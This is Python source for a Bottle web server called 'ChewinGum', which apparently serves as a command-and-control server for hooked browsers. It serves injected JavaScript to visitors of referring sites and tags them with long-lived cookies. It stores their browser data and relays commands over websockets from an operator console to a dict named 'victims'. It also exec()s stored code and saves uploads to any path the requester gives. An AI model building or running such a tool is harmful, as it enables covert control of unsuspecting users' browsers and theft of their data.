#! /usr/bin/env python
# encoding=utf-8

#from __future__ import unicode_literals

from sys import argv, version_info

ifpy3 = version_info >= (3, 0, 0)

from cgi import escape
from hashlib import md5
#from os.path import isfile
#from os import listdir, remove
from data.libdbs import sqlitei
from time import time, ctime, strftime, localtime
from bottle.ext.websocket import websocket, GeventWebSocketServer
#from beaker.middleware import SessionMiddleware as sessionm
if ifpy3:
    unicode = str
    from urllib.parse import urlparse
    from http.client import HTTPConnection as httpconn
else:
    from urlparse import urlparse
    from httplib import HTTPConnection as httpconn
from geventwebsocket import WebSocketError
from base64 import b64encode, b64decode
from json import dumps, loads
from random import random
from bottle import run, error, get, post,\
	static_file, request, template, BaseRequest,\
	response, redirect, abort, app

BaseRequest.MEMFILE_MAX = 1024*1024*1024

#Sqlite Sqldb
user = sqlitei('./data/user.db')
gum = sqlitei('./data/gum.db')

salt = user.select('user', ['salt'], {'id':1}).fetchone()[-1]

'''
#Session (bottle.ext.session
session_opt = {
    'session.type':'file',
    'session.cookie_expires':300,
    'session.data_dir':'./data/session',
    'session.auto':True
}
apps = sessionm(app(), session_opt)
'''

def getmd5(key):
    hashs = md5()
    hashs.update(key)
    return hashs.hexdigest()

def getoken():
    token = getmd5(unicode(random()) + unicode(salt))
    response.set_cookie('token', token, path='/home')
    return token

def setheader():
    response.set_header('X-Frame-Options', 'deny')

def validate(types):
    if types == 'login':
        login_key = request.get_cookie('key')
        if login_key:
            cookies = user.select('user', ['cookie'], {'id':1}).fetchone()
            if 'LOGOUT' not in cookies and login_key in cookies:
                setheader()
                return False
    elif types == 'token':
        ctoken = request.get_cookie('token')
        ptoken = request.forms.token
        if ctoken and ptoken and ctoken == ptoken:
            return False
    return True

def b64ens(us):
    try:
        return b64encode(us)
    except UnicodeEncodeError:
        return b64encode(us.encode('utf8'))
    except TypeError:
        return b64encode(unicode(us))

@get('/<filename:re:robots.txt>')
@get('/<filename:re:favicon.ico>')
@get('/static/<filename:path>')
@post('/static/<filename:path>')
def send_static(filename):
    return static_file(filename, root = './static/')

@error(404)
@error(405)
@error(500)
def errors(gumerror):
    return template('errors',
            error = gumerror.status[:3],
            ctime = ctime())

@get('/')
@post('/')
def gumjs():
    projects = None
    domain = request.headers.get('Host')
    response.set_header('Content-Type', 'application/javascript')
    referer = request.headers.get('Referer')
    idsalt = request.get_cookie('gum')
    if idsalt:
        gum.select('object', ['upkey','browser'], {'idsalt':idsalt})
        objects = gum.cs.fetchone()
        if objects:
            return template('index',
                    domain = domain,
                    script = objects[1])
    if referer:
        gum.select('project', ['upkey','browser'], {'referer':referer})
        projects = gum.cs.fetchone()
        if not projects:
            gum.select('project', ['upkey','browser'],
                    {'referer':urlparse(referer).netloc})
            projects = gum.cs.fetchone()
    if not projects:
        gum.select('project', ['browser'], {'referer':'$default'})
        projects = gum.cs.fetchone()
    return template('index',
            domain = domain,
            script = projects[-1] if projects[-1] else '')

@get('/login')
@get('/home/rekey')
def rekey():
    if validate('login'):
        return template('login', uri='/login')
    return template('login', uri='/home/rekey', token=getoken())

@post('/login')
@post('/home/rekey')
def login_rekey():
    rekey = None
    referer = unicode(request.headers.get('Referer'))
    if urlparse(referer).path == '/home/rekey':
        if not validate('login'):
            if validate('token'):
                abort(404)
            rekey = True
        else:
            abort(404)
    filekey = request.files.get('filekey')
    urlkey = request.forms.urlkey
    if filekey:
        key = filekey.file.read()
    elif urlkey:
        itime = strftime('%y%m%d%H', localtime(time()))
        ttime = user.select('user', ['key'], {'id':2}).fetchone()
        if ttime and itime in ttime:
            user.update('user', {'key':itime}, {'id':2})
            user.commit()
            redirect(referer)
        try:
            keyurl = urlparse(urlkey)
            httpkey = httpconn(keyurl.netloc)
            httpkey.request('GET', keyurl.path)
            key = httpkey.getresponse().read()
        except Exception as e:
            print(e.message)
            redirect(referer)
    else:
        redirect(referer)
    user.select('user', ['key'], {'id':1})
    keys = getmd5(b64encode(key) + salt)
    ykeys = user.cs.fetchone()[0]
    if keys != ykeys:
        if rekey:
            user.update('user', {'key':keys}, {'id':1})
        else:
            redirect(referer)
    else:
        user.select('user', ['id','salt','key','cookie'], {'id':1})
        keyhash = getmd5(b64ens(user.cs.fetchone()) + unicode(random()))
        user.update('user', {'cookie':keyhash}, {'id':1})
        response.set_cookie('key', keyhash, httponly = True,
                max_age = 604800, path = '/home')
    user.commit()
    redirect('/home')

@post('/home/logout')
def logout():
    if validate('login') or validate('token'):
        abort(404)
    user.update('user', {'cookie':'LOGOUT'}, {'id':1})
    user.commit()
    redirect('/login')

@get('/home')
def home():
    if validate('login'):
        abort(404)
    gum.select('project', ['id','referer','upkey'])
    projects = gum.cs.fetchall()
    gum.select('object', ['idsalt','name','upkey'])
    objects = gum.cs.fetchall()
    gum.select('project', ['id'], {'upkey':'yes'})
    newid = gum.cs.fetchone()[0]
    return template('home',
            title='Home',
            new = newid,
            projects = projects, objects = objects,
            token = getoken())

@post('/home/<ids:int>/setting')
def set_project(ids):
    upkey = gum.select('project', ['upkey'], {'id':ids}).fetchone()
    if validate('login') or validate('token') or not upkey:
        abort(404)
    referer = request.forms.name
    if not referer:
        return 0
    setserver = unicode(request.forms.server)
    setbrowser = unicode(request.forms.browser)
    gum.update('project', {
        'upkey':'no',
        'referer':referer,
        'server':setserver,
        'browser':setbrowser
        }, {'id':ids})
    if upkey[0] == 'yes':
       gum.insert('project', ['upkey'], ['yes'])
    gum.commit()
    redirect('/home/project/' + ids)

@get('/home/project/<ids:int>')
def edit_project(ids):
    if validate('login'):
        abort(404)
    projects = gum.select('project', ['*'], {'id':ids}).fetchone()
    if not projects:
        abort(404)
    return template('setting.tpl',
            id = ids,
            title='Project',
            name = projects[2] if projects[2] else '',
            server = projects[4] if projects[4] else '',
            browser = projects[3] if projects[3] else '',
            idsalt = ids,
            token = getoken())

@get('/home/object/<idsalt:re:[a-z0-9]+>')
def edit_object(idsalt):
    if validate('login'):
        abort(404)
    objects = gum.select('object', [
        'upkey', 'name', 'browser', 'server', 'life'
        ], {'idsalt':idsalt}).fetchone()
    if not objects or objects[0] == 'yes':
        abort(404)
    infos = gum.select('info', ['id'], {'idsalt':idsalt}).fetchall()
    return template('setting.tpl',
            id = idsalt,
            title='Object',
            name = objects[1],
            browser = objects[2] if objects[2] else '',
            server = objects[3] if objects[3] else '',
            life = objects[4] if objects[4] else 'unknown',
            idsalt = idsalt, infos = infos,
            token = getoken())

@post('/home/<idsalt:re:[a-z0-9]+>/useing')
def set_object(idsalt):
    upkey = gum.select('object', ['upkey'], {'idsalt':idsalt}).fetchone()[0]
    if validate('login') or validate('token')\
            or not upkey or upkey == 'yes':
        abort(404)
    name = request.forms.name
    if not name:
        return False
    server = request.forms.server
    browser = request.forms.browser
    gum.update('object', {
        'name':name,
        'browser':browser,
        'server':server
        },{'idsalt':idsalt})
    gum.commit()
    redirect('/home/object/' + idsalt)

@get('/home/<ids:int>/info')
def seeinfo(ids):
    upkey = gum.select('info', ['upkey'], {'id':ids}).fetchone()[0]
    if validate('login') or not upkey or upkey == 'yes':
        abort(404)
    infos = gum.select('info', [
        'idsalt', 'serverinfo', 'browserinfo'
        ], {'id':ids}).fetchone()
    return template('seeinfo',
            idsalt = infos[0],
            title='Seeinfo',
            serverinfo = loads(infos[1]),
            browserinfo = loads(infos[2]),
            ids = ids,
            token = getoken())

@post('/home/delete/<state:re:Object>/<ids:re:[a-z0-9]+>')
@post('/home/delete/<state:re:Project>/<ids:int>')
@post('/home/delete/<state:re:Seeinfo>/<ids:int>')
def deletes(state, ids):
    if validate('login') or validate('token'):
        abort(404)
    state = 'info' if state == 'Seeinfo' else state.lower()
    idname = 'idsalt' if (state == 'object') else 'id'
    upkey = gum.select(state, ['upkey'], {idname:ids}).fetchone()
    if upkey and upkey != 'yes':
        if state == 'project' and ids == 1:
            redirect('/home')
        gum.delete(state, {idname:ids})
        gum.commit()
    redirect('/home')

@get('/home/plus')
def list_plus():
    if validate('login'):
        abort(404)
    return template('plus',
            token=getoken(),
            title='Plugins')
#    dirpath = request.query.ls if request.query.ls else './static/'
#    template('plus',lsdir = listdir(dirpath))

@post('/home/plus/up')
def plus_up():
    if validate('login') or validate('token'):
        abort(404)
    upload = request.files.get('plus')
    upload.save(request.forms.path + upload.filename)
    redirect('/home/plus')

@get('/ing')
@post('/ing')
def ing():
    projects = server = updates = None
    serverinfo = {}
    browserinfo = {}
    ifstatus = returns = ''
    idsalt = request.get_cookie('gum')
    referer = request.headers.get('Referer')
#    sessionid = request.environ.get('beaker.session')
    if idsalt:
        gum.select('object', ['upkey','server'], {'idsalt':idsalt})
        server = gum.cs.fetchone()
        server = (server[1] if server[1] else '') if server else ''
    if server == None:
        if referer:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'referer':referer}).fetchone()
        if referer and not projects:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'referer':urlparse(referer).netloc}).fetchone()
        if not referer or not projects:
            projects = gum.select('project', [
                'upkey', 'id', 'server', 'browser'
                ], {'id':1}).fetchone()
        server = setserver = projects[2] if projects[2] else ''
        setbrowser = projects[3] if projects[3] else ''
        setname = str(referer) + '_' + ctime() + '_' + str(projects[1])
        idsalt =  getmd5(str(setname) + str(salt))
        response.set_cookie('gum', idsalt,
                httponly = True, max_age = 946080000)
        gum.update('object', {
            'idsalt':idsalt,
            'name':setname,
            'browser':setbrowser,
            'server':setserver,
            'upkey':'no'
            }, {'upkey':'yes'})
        gum.insert('object', ['upkey'], ['yes'])
#    updates = True if sessionid.get(referer) else False
    if server:
        try:
            exec(server)
        except Exception as e:
            print('ConfigError: server code error.')
            print(e.message)
            serverinfo['SERVER_CODE_ERROR'] = b64ens(e.message)
    if not updates:
#        infoid = gums.execute("select id from info where upkey=?",
#                ['yes']).fetchone()[0]
        gum.update('info', {
            'upkey':'no',
            'idsalt':idsalt,
            'serverinfo':dumps(serverinfo),
            'browserinfo':dumps(browserinfo),
            }, {'upkey':'yes'})
        gum.insert('info', ['upkey'], ['yes'])
#        sessionid[referer] = [infoid, browserinfo]
#    else:
#        gums.execute("update info set browserinfo=? where id=?",
#		[dumps(browserinfo), sessionid.get(referer)[0]])
    gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
#    sessionid.save()
    gum.commit()
    if ifstatus:
        abort(ifstatus, returns)
    return returns

consoles = {}
victims = {}
@get('/connect', apply=[websocket])
@get('/home/connect', apply=[websocket])
def cconnect(ws):
    if not validate('login'):
        lineor = True
        idsalt = request.query.idsalt
    else:
        lineor = False
        idsalt = request.get_cookie('gum')
    idsalt = idsalt if idsalt else ''
    upkey = gum.select('object', ['upkey'], {'idsalt':idsalt}).fetchone()
    if not idsalt or not upkey or upkey[0] == 'yes':
        abort(404)
    if lineor:
        consoles[idsalt] = ws
    else:
        if not idsalt in victims:
            victims[idsalt] = [ws]
        else:
            victims[idsalt].append(ws)
#        gum.update('object', {'life':ctime()}, {'idsalt':idsalt})
#        gum.commit()
    while True:
        try:
            cmdinfo = ws.receive().decode('utf8')
        except (UnicodeDecodeError, UnicodeEncodeError,
                AttributeError, TypeError) as e:
            print(e.message)
            cmdinfo = ws.receive()
        except Exception as e:
            print(e.message)
            break
        if cmdinfo is not None:
            ur = unicode(ws)[-10:]
            try:
                if lineor:
                    for v in victims[idsalt]:
                        v.send(cmdinfo)
                else:
                    consoles[idsalt].send(ur + escape(cmdinfo))
            except KeyError as e:
                consoles[idsalt].send(
                    escape('No User, {error}'.format(error=e.message)))
            except WebSocketError as e:
                consoles[idsalt].send(
                    escape(ur + ' {error}'.format(error=e.message)))
        else: break
    ws.close()
#    if lineor:
#        del consoles[idsalt]
#    else:
#        del victims[idsalt]

@get('/home/console')
def console():
    domain = request.headers.get('Host')
    return template('console',
            domain=domain,
            token=getoken(),
            title='Console')

def main(host, port, debug):
#    run(host=host, port=port, debug=debug)#, app=apps)
    run(host=host, port=port, debug=debug, server=GeventWebSocketServer)

if __name__ == '__main__':
    if len(argv) <= 1 or ('-h' in argv) or ('--help' in argv):
        print(b64decode(b64encode('ChewinGum')))
        print('''
usage:
	python ./chewingum.py [ host port debug | -h ]

	-h --help
''')
    else:
        host = (argv[1] if argv[1] else '0.0.0.0') if len(argv) > 1 else '0.0.0.0'
        port = (argv[2] if argv[2] else '80') if len(argv) > 2 else '80'
        debug = (True) if len(argv) > 3 else False
        main(host, port, debug)

application = app()
